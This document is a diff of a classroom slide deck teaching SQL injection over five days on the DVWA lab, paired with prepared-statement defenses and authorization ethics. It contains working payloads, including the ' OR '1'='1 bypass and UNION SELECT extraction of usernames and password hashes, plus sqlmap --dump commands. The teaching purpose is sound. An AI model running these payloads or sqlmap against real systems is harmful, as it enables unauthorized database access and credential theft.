@@ -9,11 +9,23 @@ footer: "Curriculum by AJ Hammond — PNPT, CRTO, OSCP, BSCP"
 <!-- _class: lead -->
 
 # SQL Injection
-## Unit 12 — How One Quote Can Dump a Database
+## Unit 12 — How a single quote can dump a whole database
 
-A single quote in the wrong place can read an entire database — and one line of code can stop it. Let's see both sides.
+One of the most famous and damaging web bugs of all time — and exactly how a developer stops it.
 
-<!-- teacher note: Module 3, lands right before the web-vuln writeup project. The big idea: SQLi changes the MEANING of a query. Attacks are always paired with their defense (prepared statements). -->
+<!-- 5 class periods. Core idea students must leave with: SQLi is not "guessing passwords" — it is CHANGING THE MEANING OF THE QUERY. The before/after query comparison is the key visual all week. -->
+
+---
+
+# What we'll do this week
+
+- **Day 1:** Databases & SQL, and where the bug lives
+- **Day 2:** Authentication bypass (`' OR '1'='1`)
+- **Day 3:** Pulling data out — UNION, error-based, blind, and sqlmap
+- **Day 4:** The defense — prepared statements stop it
+- **Day 5:** Document it (feeds the web-vuln writeup project)
+
+<!-- This unit lands right before the Module 3 web-vuln writeup project. Every injection is evidence for a finding. -->
 
 ---
 
@@ -21,232 +33,505 @@ A single quote in the wrong place can read an entire database — and one line o
 
 By the end of this unit you can:
 
-- **Define** a database and SQL, and write a simple `SELECT ... WHERE` query in plain terms.
-- **Explain** how a web app turns user input into a query — and why that's dangerous.
-- **Describe** SQL injection as "untrusted input changing the meaning of a query."
-- **Perform** an authentication bypass (`' OR '1'='1`) and **explain** why it works.
-- **Demonstrate** UNION-based extraction and **distinguish** error-based from blind SQLi.
+- **Define** what a database and SQL are; write a simple `SELECT ... WHERE`.
+- **Explain** how a web app turns user input into a query, and why mixing them is dangerous.
+- **Describe** SQLi as "untrusted input changing the meaning of a query."
+- **Perform** a classic auth bypass (`' OR '1'='1`) and explain why it works.
+- **Demonstrate** UNION-based extraction and pull sample data from a lab target.
+
+---
+
+# Learning objectives (continued)
+
+- **Distinguish** error-based from blind SQLi at an awareness level.
 - **Use** `sqlmap` responsibly against a **lab-only** target.
-- **Recommend** layered defenses — **prepared statements**, input validation, least privilege.
+- **Recommend** layered defenses — **parameterized queries / prepared statements**, input validation, least privilege.
+- **Show** that raising DVWA's security level stops the attack.
 
 ---
 
-# Databases & SQL in 60 seconds
-
-- A **database** stores data in **tables** — columns are fields, rows are records.
-- **SQL** (Structured Query Language) is how you ask a database questions.
-
-```sql
-SELECT name FROM users WHERE name = 'Maya';
-```
-
-- **SELECT** = read data · **WHERE** = filter which rows come back.
-
-<!-- teacher note: Warm-up — "When you log in, how does the site KNOW your password is right?" It looks you up in a database. -->
-
----
-
-# Where the bug lives
-
-A web login builds a query by **gluing your input into a SQL string**:
-
-```sql
-SELECT * FROM users
-WHERE name = 'YOU_TYPE_THIS' AND pass = 'AND_THIS';
-```
-
-> The app can't tell **your data** from **SQL commands** if it just pastes input into the query.
-
-That confusion *is* SQL injection: **untrusted input changes the meaning of the query.**
-
-<!-- teacher note: Hammer this — SQLi is NOT "guessing passwords." The attacker rewrites the question. The before/after query is the key visual all unit. -->
-
----
-
-# Authentication bypass: `' OR '1'='1`
-
-```sql
--- Intended query:
-... WHERE name = 'Maya' AND pass = 'secret';
-
--- Attacker types:  ' OR '1'='1' --
-... WHERE name = '' OR '1'='1' -- ' AND pass = '...';
-```
-*(lab-only demonstration)*
-
-- The leading `'` **closes** the app's string.
-- `OR '1'='1'` is **always true** → the filter no longer filters.
-- `--` **comments out** the rest (the password check).
-
-> The attacker didn't guess a password. They **rewrote the question.**
-
-<!-- teacher note: Slow WAY down on the quotes. Show the full resulting query explicitly. Exit ticket — "Why does ' OR '1'='1 let someone in without a password?" -->
-
----
-
-# Pulling data out: UNION
-
-A `UNION` attaches a **second query's results** to the app's results — both must return the **same number of columns**.
-
-```sql
--- find the column count
-1' ORDER BY 2 -- -          -- works
-1' ORDER BY 3 -- -          -- errors → 2 columns
-
--- extract real data
-1' UNION SELECT user, password FROM users -- -
-```
-*(lab-only demonstration)*
-
-> Now the page displays **usernames and password hashes** — the whole credential store.
-
-<!-- teacher note: Keep the space after --. The teaching payoff: they extracted the credential store. Hashes vs plaintext is Unit 14; here the EXTRACTION is the critical finding. -->
-
----
-
-# Error-based vs blind SQLi (awareness)
-
-| Style | How data comes out |
-|-------|-------------------|
-| **Error-based** | Data leaks through the database's **error messages** |
-| **Blind** | **No visible output** — ask true/false questions, watch the **page or its timing** change |
-
-- That `'` that triggered an error in the lab? That's the **error-based** idea.
-- If there were no errors and no output, you'd go **blind**.
-
-<!-- teacher note: Awareness depth only. Exit ticket — "Name the three SQLi styles and one difference between UNION-based and blind." Blind is a stretch-goal in the THM room. -->
-
----
-
-# Automating with sqlmap (lab-only)
-
-`sqlmap` finds and exploits SQLi automatically — it does by tool what you just did by hand.
-
-```bash
-sqlmap -u "http://<DVWA-IP>/vulnerabilities/sqli/?id=1&Submit=Submit" \
-  --cookie="PHPSESSID=<session>; security=low" --batch -D dvwa -T users --dump
-```
-
-> It is **loud, powerful, and dangerous if misused.** Point it **ONLY** at the approved lab target — never anything else.
-
-<!-- teacher note: Pre-test the exact command and runtime; it can look like it "hangs." Frame it as a DEMONSTRATION of automation, not the point of the unit. Understanding + defense is the point. -->
-
----
-
-# 🛡️ Defense: prepared statements stop it
-
-**The single most direct fix:** input is sent as **data**, never mixed into the SQL text.
-
-```php
-// Vulnerable (Low): input glued straight in
-$q = "SELECT ... WHERE user_id = '$id'";
-
-// Fixed (Impossible): bound parameter
-$stmt = $pdo->prepare("SELECT ... WHERE user_id = :id");
-$stmt->execute([':id' => $id]);
-```
-
-> With a prepared statement, your quote is just a **harmless character** — it can't change the query's meaning.
-
-<!-- teacher note: Use DVWA's "View Source" to compare Low vs Impossible — the code diff is the best teaching tool in the unit. -->
-
----
-
-# Defense in depth
-
-| Layer | What it does |
-|-------|--------------|
-| **Prepared statements** | Input is data, never code — **primary fix** |
-| **Input validation** | Reject input that isn't the expected type/format |
-| **Least privilege** | The app's DB account can't read every table — limits the damage |
-
-> Prepared statements stop the injection; validation and least privilege limit the blast radius if anything slips through.
-
-<!-- teacher note: Warm-up Day 4 — "If you were the developer, how would you make ' OR '1'='1 do nothing?" Then raise DVWA to High/Impossible and watch the same payloads fail. -->
-
----
-
-<!-- _class: lead -->
-
-# ⚖️ Ethics & Authorization
-
-## SQL injection is not a gray area.
-
-Pointing SQLi — or `sqlmap` — at any database you don't own or have **written permission** to test is a crime under the **CFAA** and state law. It can destroy real data and real people's privacy.
-
-Targets are **DVWA and authorized TryHackMe rooms ONLY** — apps built to be broken, in an **isolated lab**. Never a real site.
-
-<!-- teacher note: Discussion — a student's part-time job's order form returns extra data when they type a quote. Responsible next step? Where exactly is the authorization boundary, and what would crossing it look like? -->
-
----
-
-# Key vocabulary
+# Vocabulary — databases & SQL (1 of 2)
 
 | Term | Meaning |
 |------|---------|
-| Database / Table | Organized data store / a grid of rows & columns |
-| SQL / Query | The language to ask a DB / one request to it |
-| SELECT / WHERE | Read data / filter which rows return |
-| SQL injection | Untrusted input changes a query's **meaning** |
-| Authentication bypass | Tricking a login without valid credentials |
-| UNION-based | Append attacker data to the results |
-| Error-based / Blind | Leak via errors / infer via true-false & timing |
-| sqlmap | Automated SQLi tool (lab-only) |
-| Prepared statement | Input sent as **data**, never as code |
-| Least privilege | Give an account only the access it needs |
+| Database | An organized store of data, usually tables of rows and columns. |
+| Table | A grid; columns are fields (like `username`), rows are records. |
+| SQL | Structured Query Language — used to ask a database questions. |
+| Query | A request to a database ("give me the user named Maya"). |
+| SELECT | The SQL command that reads/returns data. |
+| WHERE | The part of a query that filters which rows you get. |
 
 ---
 
-# 🧪 Lab launch
+# Vocabulary — the attack & defense (2 of 2)
 
-**Platform: DVWA (Damn Vulnerable Web Application) + Kali / AttackBox**
-
-- Confirm the lab is **isolated**, log in, set Security to **Low**.
-- `'` to prove the field is **injectable** → `1' OR '1'='1` to **dump all users**.
-- `ORDER BY` to count columns → `UNION SELECT user, password FROM users -- -`.
-- Run **`sqlmap`** against the **DVWA target only** to see the automation.
-- Raise Security to **High/Impossible**, watch it fail, and **View Source** to see the prepared statement.
-
-> Scope statement first: *"I am authorized to test only DVWA inside the isolated class lab."*
-
-<!-- teacher note: Isolation is non-negotiable — host-only/internal networking, confirmed before Day 1. Set Low for attack days; you MUST raise it for the defense day or the fix isn't visible. -->
-
----
-
-# Document it: the finding writeup
-
-Every injection you ran is **evidence** for a report. A good finding has:
-
-1. **Description** — what the vulnerability is
-2. **Reproduction steps** — the exact payloads
-3. **Evidence** — screenshots (the `'` error, the user dump, the source diff)
-4. **Impact** — full credential disclosure → **High / Critical**
-5. **Remediation** — **use prepared statements** (+ validation, least privilege)
-
-> A finding without a **remediation** is not finished.
-
-<!-- teacher note: This becomes one finding in the Module 3 web-vuln writeup project. Review the report rubric in instructor/grading-and-rubrics.md. -->
-
----
-
-# Recap
-
-- SQLi = **untrusted input changes the meaning of a query.**
-- `' OR '1'='1` works because it makes the `WHERE` filter **always true**.
-- **UNION** extracts data; **error-based/blind** are other styles; **sqlmap** automates it.
-- The one direct fix: **prepared statements** (input as data, not code).
-- Defense in depth: + **input validation** + **least privilege**.
+| Term | Meaning |
+|------|---------|
+| SQL injection (SQLi) | Untrusted input changes the *meaning* of a query. |
+| Authentication bypass | Tricking a login to let you in without valid credentials. |
+| UNION-based SQLi | Using `UNION` to attach attacker-chosen data to the results. |
+| Error-based SQLi | Pulling data out through the database's error messages. |
+| Blind SQLi | Extracting data with no visible output, via true/false or timing. |
+| sqlmap | An automated SQLi tool — **lab-only** in this class. |
+| Prepared statement | A safe query where input is sent as **data**, never as SQL text. |
+| Least privilege | Giving an account only the access it needs. |
 
 ---
 
 <!-- _class: lead -->
 
-# Exit ticket & discussion
+# ⚖️ Ethics & authorization
 
-1. In your own words, why does `' OR '1'='1` let someone in without a password?
-2. Which single defense most directly stops SQL injection, and **why**?
-3. **Discuss:** Why does a prepared statement defeat injection when input validation **alone** might not?
+## SQL injection is not a gray area.
 
-**Next up — Module 3 web-vuln writeup project** (your SQLi finding feeds it!)
+<!-- Some of the largest breaches in history started with one injectable form field. Make the stakes real. -->
 
-<!-- teacher note: Collect the SQLi finding draft. Quiz at end of Day 5 or start of Week 13. Reset DVWA from snapshot if anyone is stuck. -->
+---
+
+# ⚖️ The rules for this unit
+
+- Pointing SQLi — or **sqlmap** — at any database you don't own or lack **written permission** to test is a crime (CFAA + state law).
+- It can **destroy real data** and expose **real people's privacy**.
+- The **only** legal targets here: **DVWA** and **authorized TryHackMe rooms** — apps that exist to be broken, on an **isolated** network.
+
+> The skill you're learning is **defense**: once you see how easily an unprotected query falls, you'll never write one — and you'll know how to fix the ones you find.
+
+---
+
+<!-- _class: lead -->
+
+# Day 1
+## Databases & SQL, and where the bug lives
+
+<!-- Warm-up: "When you log into a website, how does it KNOW your password is right?" (It looks you up in a database.) -->
+
+---
+
+# Databases in 60 seconds
+
+A database stores data in **tables** of **rows** and **columns**.
+
+**`users` table:**
+
+| user_id | username | password |
+|---------|----------|----------|
+| 1 | admin | 5f4dcc3b... |
+| 2 | gordonb | e99a18c4... |
+
+- **Columns** = fields (`username`)
+- **Rows** = records (one user each)
+
+---
+
+# A simple SQL query
+
+```sql
+SELECT username FROM users WHERE username = 'Maya';
+```
+
+In plain English:
+- **SELECT** `username` → which column(s) to return
+- **FROM** `users` → which table
+- **WHERE** `username = 'Maya'` → which rows (the **filter**)
+
+> `WHERE` is the filter. Remember that — the whole attack targets the filter.
+
+---
+
+# How a login builds a query
+
+The app glues your typed input into a SQL string:
+
+```sql
+SELECT * FROM users
+WHERE username = '<your input>' AND password = '<your input>';
+```
+
+- You type `Maya` → the app pastes `Maya` between the quotes.
+- The danger: if the app just **pastes** input, it can't tell **your data** from **SQL commands**.
+
+> The bug lives at the moment input is glued straight into the query.
+
+---
+
+# What if the input contains SQL?
+
+Type this as the username:
+
+```
+Maya' --
+```
+
+The query becomes:
+
+```sql
+SELECT * FROM users WHERE username = 'Maya' -- ' AND password = '...';
+```
+
+- The `'` **closes** the app's string early.
+- `--` **comments out** the rest (the password check vanishes).
+
+> The attacker didn't break in — they **rewrote the question.**
+
+<!-- This board exercise (build the query, then inject) is the core Day 1 moment. -->
+
+---
+
+# Day 1 guided practice & exit ticket
+
+1. As a class, build the login query on the board.
+2. Instructor types `Maya' --` into "username"; class predicts the resulting query.
+3. In journals: write one `SELECT ... WHERE` query in **plain English** and in **SQL**.
+
+**Exit ticket:** *In one sentence, why is gluing user input directly into a SQL query dangerous?*
+
+<!-- Because the database can't tell data from commands — input can change the query's meaning. -->
+
+---
+
+<!-- _class: lead -->
+
+# Day 2
+## Authentication bypass: `' OR '1'='1`
+
+<!-- Warm-up: show the Day 1 login query. "What if the WHERE condition could always be true?" -->
+
+---
+
+# The always-true trick
+
+Submit this as the User ID / username:
+
+```
+1' OR '1'='1
+```
+
+The query changes from:
+
+```sql
+SELECT first_name, surname FROM users WHERE user_id = '1'
+```
+
+to:
+
+```sql
+SELECT first_name, surname FROM users WHERE user_id = '1' OR '1'='1'
+```
+
+---
+
+# Why it works, step by step
+
+```
+1' OR '1'='1
+│ │  │
+│ │  └─ '1'='1' is ALWAYS true
+│ └──── OR joins it to the original condition
+└────── the ' closes the app's string
+```
+
+- `WHERE user_id = '1' OR '1'='1'` → the `OR '1'='1'` is **always true**.
+- A filter that's always true **filters nothing** → **every row** comes back.
+
+> The attacker didn't guess a password. They made the filter meaningless.
+
+<!-- Slow down on the quotes. The leading quote CLOSES the app's string. Show the full resulting query explicitly. -->
+
+---
+
+# The classic login-form version
+
+```
+' OR '1'='1' -- -
+```
+
+```sql
+SELECT * FROM users WHERE username = '' OR '1'='1' -- -' AND password = '...';
+```
+
+- `OR '1'='1'` → always true, so a user row returns.
+- `-- -` → comments out the **password check** entirely.
+- Result: logged in **without a valid password.**
+
+> `-- -` keeps the trailing space so the comment is valid. Lab-only demonstration.
+
+---
+
+# Day 2 lab & exit ticket
+
+**Lab (Security = Low):** read the safety reminder aloud, then on DVWA's **SQL Injection** page:
+
+- Step 1: enter `1` → see the normal, intended result.
+- Step 2: enter `'` → a **database error** confirms the field is injectable. Screenshot it.
+- Step 3: enter `1' OR '1'='1` → **all users** return. Record the before/after query.
+
+**Exit ticket:** *Explain in your own words why `' OR '1'='1` lets someone in without a password.*
+
+<!-- The always-true OR defeats the filter; the comment removes the password check. -->
+
+---
+
+<!-- _class: lead -->
+
+# Day 3
+## Pulling data out: UNION, error-based, blind & sqlmap
+
+<!-- Warm-up: "Getting in is one thing. How would an attacker read the WHOLE user table?" -->
+
+---
+
+# Step 1: find the number of columns
+
+A `UNION` only works if both queries return the **same number of columns**. Probe with `ORDER BY`:
+
+```sql
+1' ORDER BY 1 -- -
+1' ORDER BY 2 -- -
+1' ORDER BY 3 -- -
+```
+
+- Works at 1 and 2, then **errors at 3** → the query returns **2 columns**.
+- `-- -` is a comment that ignores the rest of the original query (keep the space).
+
+---
+
+# UNION-based extraction
+
+First prove you control the output:
+
+```sql
+1' UNION SELECT 1,2 -- -
+```
+
+A row showing `1` and `2` confirms your data is displayed. Now pull real data:
+
+```sql
+1' UNION SELECT user, password FROM users -- -
+```
+
+> Output: a list of **usernames and (MD5) password hashes** from the `users` table.
+
+<!-- DVWA default users: admin, gordonb, 1337, pablo, smithy. -->
+
+---
+
+# What you just extracted
+
+- These are **hashes**, not plaintext passwords.
+- Cracking them is Unit 14's topic — but you've already **extracted the credential store.**
+- That alone is a **critical-severity** finding.
+
+**Recon variations (lab-only):**
+
+```sql
+1' UNION SELECT @@version, database() -- -
+```
+
+> Pulls the database version and current database name.
+
+---
+
+# Error-based vs blind SQLi
+
+| | Error-based | Blind |
+|--|-------------|-------|
+| What leaks | Data/confirmation via **error messages** | **Nothing** visible |
+| How you read it | Read the error text | Ask **true/false** questions; watch behavior or timing |
+| Example trigger | `'` returns a SQL error | Page looks the same — infer from response/timing |
+
+> The `'` error in Step 2 yesterday was **error-based**. With no output, you'd go **blind.**
+
+---
+
+# sqlmap — automation (lab-only)
+
+`sqlmap` automates what you did by hand. It is **loud, powerful, and dangerous if misused** — point it **only** at DVWA.
+
+```bash
+sqlmap -u "http://<DVWA-IP>/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=<your-session>; security=low" --batch --dbs
+```
+
+- `--cookie` → your authenticated DVWA session
+- `--dbs` → list the databases
+- `--batch` → accept defaults non-interactively
+
+---
+
+# sqlmap — dumping the table (lab-only)
+
+```bash
+sqlmap -u "http://<DVWA-IP>/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=<your-session>; security=low" \
+  --batch -D dvwa -T users --dump
+```
+
+- `-D dvwa -T users --dump` → dump the `users` table.
+- sqlmap may even offer to **crack the hashes**.
+
+> sqlmap reproduced your manual attack in seconds — **that** is why it's dangerous off-leash. DVWA target only.
+
+---
+
+# Day 3 lab & exit ticket
+
+**Lab:** UNION-extract usernames/hashes from DVWA; then run `sqlmap` against the **DVWA target only** and save the output to your journal.
+
+**Exit ticket:** *Name the three SQLi styles we mentioned and one difference between UNION-based and blind.*
+
+<!-- Styles: UNION/error-based/blind. UNION shows extracted data directly in the page; blind shows nothing and infers via true/false or timing. -->
+
+---
+
+<!-- _class: lead -->
+
+# Day 4
+## The defense: prepared statements stop it
+
+<!-- Warm-up: "If you were the developer, how would you make ' OR '1'='1 do nothing?" -->
+
+---
+
+# DEFENSE: parameterized queries (prepared statements)
+
+Separate the **query** from the **data**. Input is **bound** as a parameter — never parsed as SQL.
+
+**Vulnerable (Low):**
+
+```php
+$query = "SELECT first_name, surname FROM users WHERE user_id = '$id';";
+```
+
+**Safe (Impossible) — PDO prepared statement:**
+
+```php
+$stmt = $pdo->prepare('SELECT first_name, surname FROM users WHERE user_id = :id');
+$stmt->execute([':id' => $id]);
+```
+
+> The `:id` placeholder means a quote in `$id` is just **data**. It can never change the query.
+
+---
+
+# Why prepared statements win
+
+- The query structure is **fixed before** your input ever arrives.
+- Your input fills a **slot** — it can't add `OR`, `UNION`, or `--`.
+- A quote loses its power because it's **never parsed as SQL**.
+
+> This is the **single most direct fix** for SQL injection.
+
+---
+
+# DEFENSE: defense-in-depth
+
+| Layer | What it does |
+|-------|--------------|
+| **Prepared statements** | Primary fix — input is data, never code. |
+| **Input validation** | Reject input that isn't the expected type/format. |
+| **Least privilege** | The app's DB account can't read every table → smaller blast radius. |
+
+**Why validation isn't enough alone:** some fields must allow quotes (the name `O'Brien`!), and a blocklist can always miss a string. Prepared statements don't depend on guessing every bad input.
+
+---
+
+# Day 4 lab & exit ticket
+
+**Lab Step 8:** raise DVWA Security to **High/Impossible**, re-run the Day 2–3 injections — they **fail**.
+
+```
+1' OR '1'='1
+1' UNION SELECT user, password FROM users -- -
+```
+
+Use **View Source** to compare **Low** (input glued in) vs **Impossible** (bound parameter). Screenshot both.
+
+**Exit ticket:** *Which single defense most directly stops SQL injection, and why?*
+
+<!-- Prepared statements: input is sent as data and bound to a placeholder, so it can never change the query structure. -->
+
+---
+
+<!-- _class: lead -->
+
+# Day 5
+## Document it (feeds the web-vuln writeup project)
+
+<!-- Warm-up: "What would a developer need from you to fix this bug?" (Clear steps, evidence, a fix.) -->
+
+---
+
+# Anatomy of a professional finding
+
+A good finding lets a developer **reproduce** and **fix** the bug:
+
+1. **Description** — plain language, non-technical-friendly
+2. **Reproduction steps** — the exact payloads you used
+3. **Evidence** — labeled screenshots
+4. **Impact & severity** — what an attacker gains, and how bad
+5. **Remediation** — the specific fix
+
+> SQLi is typically **High / Critical** severity.
+
+---
+
+# Your SQLi finding — fill these in
+
+| Section | Your content |
+|---------|--------------|
+| Description | An unauthenticated user can alter the SQL query via the User ID field. |
+| Reproduction | `'` (error) → `1' OR '1'='1` (all rows) → `1' UNION SELECT user, password FROM users -- -` |
+| Evidence | Screenshots: `'` error, all-users dump, hash dump, Low-vs-High source |
+| Impact / severity | Full credential-store disclosure → **High/Critical** |
+| Remediation | Prepared statements (primary) + input validation + least privilege |
+
+---
+
+# Day 5 lab & exit ticket
+
+**Lab Step 9:** turn your DVWA journal into a clean **SQLi finding writeup** — description → reproduction → evidence → impact → remediation. This becomes one finding in the Module 3 web-vuln writeup project.
+
+**Exit ticket:** submit the finding draft + one sentence: *biggest surprise about how easy/hard this was.*
+
+<!-- Collect drafts. Attacks must always be paired with a remediation — don't accept a finding without the prepared-statement fix. -->
+
+---
+
+# Lab deliverables
+
+- Journal entries for Steps 1–9 with **labeled screenshots**: normal query, the `'` error, the all-users dump, the UNION hash dump, sqlmap output, and the Low-vs-High **View Source** comparison.
+- A plain-English explanation (5–6 sentences) of why `' OR '1'='1` works.
+- A draft **SQLi finding writeup** (description → reproduction → evidence → impact → remediation).
+
+---
+
+# Recap — the big ideas
+
+- A **database** stores data in tables; **SQL** queries it; **WHERE** filters rows.
+- **SQLi** = untrusted input **changes the meaning** of a query (not password guessing).
+- `' OR '1'='1` defeats the filter; **UNION** extracts other tables; **blind** infers with no output.
+- **sqlmap** automates it — lab targets only.
+- The fix: **prepared statements** (primary) + validation + least privilege.
+
+---
+
+# Discussion prompt
+
+> A student finds their part-time job's online order form returns extra data when they type a quote mark. They're curious whether it's "really vulnerable."
+
+What's the **responsible** next step — and what would crossing the line look like? Where exactly is the **authorization boundary** here?
+
+<!-- Responsible: stop, don't probe further, report privately to the owner/manager (responsible disclosure). Crossing the line: running OR '1'='1, sqlmap, or extracting data without written permission — that's unauthorized access under the CFAA. -->
+
+---
+
+<!-- _class: lead -->
+
+# Module 3 complete
+
+You can read, modify, and attack web apps — and **defend** them.
+
+**Next:** the Module 3 **web-vulnerability writeup project** — turn your findings into a professional report.
+
+*Curriculum by AJ Hammond — PNPT, CRTO, OSCP, BSCP*
+github.com/ajm4n · linkedin.com/in/aj-hammond
